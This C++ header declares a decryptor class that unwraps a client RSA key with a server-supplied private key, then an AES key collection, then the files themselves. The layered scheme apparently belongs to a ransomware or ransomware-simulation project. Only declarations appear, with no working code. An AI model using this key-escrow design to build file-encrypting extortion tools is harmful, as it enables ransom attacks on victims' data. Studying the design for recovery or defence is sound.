
#ifndef BUTTERFLY_DECRYPTOR_H
#define BUTTERFLY_DECRYPTOR_H

#include "crypto/rsaDecryptor.h"
#include "crypto/aesDecryptor.h"
#include "params.h"

namespace butterfly
{

namespace hybrid
{

/**
 * Class Decryptor to decrypt the AES Key collection file and the CPrivateRSA key
 */
class Decryptor
{

private:
    std::string _decryptedCPrivateRSA, _decryptedAESKey;
    std::unique_ptr<rsa::RSADecryptor> _rsaDecryptorAESKey, _rsaDecryptorCPrivateRSA;
    std::unique_ptr<aes::AESDecryptor> _aesDecryptor;

public:
    /**
     * Constructor Decryptor
     */
    Decryptor();

    /**
     * Destructor Decryptor
     */
    ~Decryptor();

    /**
     * Decrypt the CPrivateRSA binary file
     *
     * @param keyFromServer: SPrivateRSA.pem from server
     * @return decrypted CPrivateRSA string
     */
    std::string decryptCPrivateRSA(const std::string &keyFromServer);

    /**
     * Decrypt the AES Key Collection file
     *
     * @param decryptedCPrivateRSA: decrypted CPrivateRSA string
     * @return decrpyted AES Key Collection file
     */
    std::string decryptAESKey(const std::string &decryptedCPrivateRSA, const std::string &aesKeyFile);

    /**
     * Decrypt the file with the AES Key
     *
     * @param filepath: path to the file
     * @param aesKey: aes key for the file
     */
    void decryptFileWithAES(const std::string &filepath, const std::string &aesKey);
};

} // namespace hybrid

} // namespace butterfly

#endif //BUTTERFLY_DECRYPTOR_H
